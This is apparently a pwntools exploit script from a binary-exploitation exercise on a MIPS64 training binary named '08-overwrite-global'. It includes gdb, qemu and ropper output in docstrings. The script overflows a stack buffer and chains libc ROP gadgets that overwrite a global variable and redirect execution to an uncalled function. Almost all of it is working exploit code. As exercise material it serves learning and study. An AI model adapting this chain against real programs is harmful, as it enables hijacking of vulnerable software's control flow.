#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x0000000120000c00 <+0>:	daddiu	sp,sp,-160
...
   0x0000000120000c78 <+120>:	ld	ra,152(sp)
   0x0000000120000c7c <+124>:	ld	s8,144(sp)
   0x0000000120000c80 <+128>:	ld	gp,136(sp)
   0x0000000120000c84 <+132>:	daddiu	sp,sp,160
   0x0000000120000c88 <+136>:	jr	ra
   0x0000000120000c8c <+140>:	nop
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x120000c20: file src/08-overwrite-global.c, line 9.
(gdb) b *0x0000000120000c78
Breakpoint 2 at 0x120000c78: file src/08-overwrite-global.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/08-overwrite-global.c:9
9		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ffd20 ""
(gdb) c
Continuing.

Breakpoint 2, 0x0000000120000c78 in vulnerable () at src/08-overwrite-global.c:14
14	}
(gdb) p/x $sp+152
$2 = 0x40007ffdb8
"""

"""
$ qemu-mips64 -L /usr/mips64-linux-gnuabi64/ -strace ./bin/mips64/08-overwrite-global
...
11254 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
11254 mmap(NULL,1880864,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x000000400085e000
"""

"""
$ ropper --nocolor --file /usr/mips64-linux-gnuabi64/lib/libc-2.27.so
0x00000000000e941c: ld $ra, 0x28($sp); ld $s2, 0x18($sp); ld $s1, 0x10($sp); ld $s0, 8($sp); jr $ra; daddiu $sp, $sp, 0x30; 
0x000000000008c3cc: ld $v0, 8($sp); ld $ra, 0x18($sp); jr $ra; daddiu $sp, $sp, 0x20;
0x000000000016b3dc: ld $ra, 0x18($sp); sd $v0, ($s0); ld $gp, 0x10($sp); ld $s0, 8($sp); jr $ra; daddiu $sp, $sp, 0x20; 
0x000000000006a82c: ld $t9, 0x18($sp); jalr $t9; nop;
"""

import struct
import sys

from pwn import *

context(arch='mips64', os='linux', endian='big', word_size=64)

binary_path = './bin/mips64/08-overwrite-global'

ra_saved_addr = 0x40007ffdb8
buffer_addr = 0x40007ffd20
libc_addr = 0x000000400085e000

ld_s0_s1_s2_addr = libc_addr + 0x00000000000e941c
ld_v0_addr = libc_addr + 0x000000000008c3cc
sd_v0_s0_addr = libc_addr + 0x000000000016b3dc
ld_r9_jalr_r9_addr = libc_addr + 0x000000000006a82c

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']
x_addr = binary.symbols['x']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (ra_saved_addr - buffer_addr)
payload += p64(ld_s0_s1_s2_addr)

payload += 'b' * 8
payload += p64(x_addr) # s0
payload += p64(0) # s1
payload += p64(0) # s2
payload += 'c' * 8
payload += p64(ld_v0_addr) # ra

payload += 'd' * 8
payload += p64(0xdeadbabebeefc0de) # v0
payload += 'e' * 8
payload += p64(sd_v0_s0_addr) # ra

payload += 'f' * 0x18
payload += p64(ld_r9_jalr_r9_addr) # ra

payload += 'g' * 0x18
payload += p64(not_called_addr) # t9

p.readuntil('> ')
p.write(payload)
p.interactive()
